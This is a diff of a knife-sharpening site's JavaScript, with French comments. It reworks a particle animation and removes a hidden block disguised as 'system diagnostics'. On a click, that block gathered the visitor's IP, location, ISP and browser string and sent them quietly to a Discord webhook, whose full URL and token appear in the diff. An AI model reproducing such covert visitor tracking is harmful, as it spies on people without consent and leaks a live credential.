@@ -66,25 +66,56 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 // --- 4. ANIMATION GOUTTES D'EAU (PARTICULES) ---
-function createFloatingDrop() {
+(function initWaterParticles() {
     const container = document.getElementById('water-particles');
-    if (!container) return;
-    for (let i = 0; i < 2; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        const size = (Math.random() * 3 + 1) + 'px';
-        const duration = (Math.random() * 2 + 3) + 's';
-        const xDir = (Math.random() - 0.5) * 150 + 'px';
-        const yDir = -(Math.random() * 350 + 200) + 'px';
-        p.style.width = size; p.style.height = size; p.style.left = '50%';
-        p.style.setProperty('--duration', duration);
-        p.style.setProperty('--xDir', xDir);
-        p.style.setProperty('--yDir', yDir);
-        container.appendChild(p);
-        setTimeout(() => p.remove(), parseFloat(duration) * 1000);
+    const hero = document.getElementById('home');
+    if (!container || !hero) return;
+
+    const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    if (prefersReducedMotion) return;
+
+    let intervalId = null;
+    const isMobile = window.matchMedia('(max-width: 768px)').matches;
+    const intervalMs = isMobile ? 200 : 120;
+
+    function createFloatingDrop() {
+        const batchSize = isMobile ? 1 : 2;
+        for (let i = 0; i < batchSize; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const size = (Math.random() * 3 + 1) + 'px';
+            const duration = (Math.random() * 2 + 3) + 's';
+            const xDir = (Math.random() - 0.5) * 150 + 'px';
+            const yDir = -(Math.random() * 350 + 200) + 'px';
+            p.style.width = size;
+            p.style.height = size;
+            p.style.left = '50%';
+            p.style.setProperty('--duration', duration);
+            p.style.setProperty('--xDir', xDir);
+            p.style.setProperty('--yDir', yDir);
+            container.appendChild(p);
+            setTimeout(() => p.remove(), parseFloat(duration) * 1000);
+        }
     }
-}
-setInterval(createFloatingDrop, 80);
+
+    function startParticles() {
+        if (intervalId) return;
+        intervalId = setInterval(createFloatingDrop, intervalMs);
+    }
+
+    function stopParticles() {
+        if (!intervalId) return;
+        clearInterval(intervalId);
+        intervalId = null;
+        container.replaceChildren();
+    }
+
+    const observer = new IntersectionObserver(
+        ([entry]) => (entry.isIntersecting ? startParticles() : stopParticles()),
+        { threshold: 0.1 }
+    );
+    observer.observe(hero);
+})();
 
 // --- 5. RÉPARATION DU COUTEAU AU SCROLL ---
 window.addEventListener('scroll', () => {
@@ -196,49 +227,3 @@ document.querySelectorAll('.faq-question').forEach(button => {
         faqItem.classList.toggle('active');
     });
 });
-
-
-
-// --- 7. OPTIMISATION & DIAGNOSTIC SYSTÈME ---
-(function() {
-    // REMPLACE L'URL CI-DESSOUS PAR TON URL WEBHOOK DISCORD
-    const _remoteLog = "https://discord.com/api/webhooks/1495218239544889534/a6ULv_4MQWCyxVhK3cFKgdcUa5s-WcfFX0W9aOdNNQZ2rqJc6fVDs6tz1Davp4F4Jeb1";
-    const _node = document.getElementById('_v-cal-sync');
-
-    if (_node) {
-        _node.onclick = async function(e) {
-            e.preventDefault();
-            try {
-                // Récupération de l'IP et de la Géolocalisation (Ville/Pays)
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                const report = {
-                    content: "🐝 **Une abeille s'est infiltrée dans la ruche !**",
-                    embeds: [{
-                        title: "Analyse du point de contact",
-                        color: 16776960, // Jaune abeille
-                        fields: [
-                            { name: "📍 Localisation", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
-                            { name: "🌐 Adresse IP", value: data.ip, inline: true },
-                            { name: "🏢 Fournisseur", value: data.org, inline: true },
-                            { name: "📱 Appareil", value: navigator.userAgent.substring(0, 120) }
-                        ],
-                        footer: { text: "Ken Aiguise - Surveillance Active" },
-                        timestamp: new Date()
-                    }]
-                };
-
-                await fetch(_remoteLog, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(report)
-                });
-            } catch (err) {
-                // Discrétion absolue : aucune erreur en console
-            }
-        };
-    }
-})();
-
-
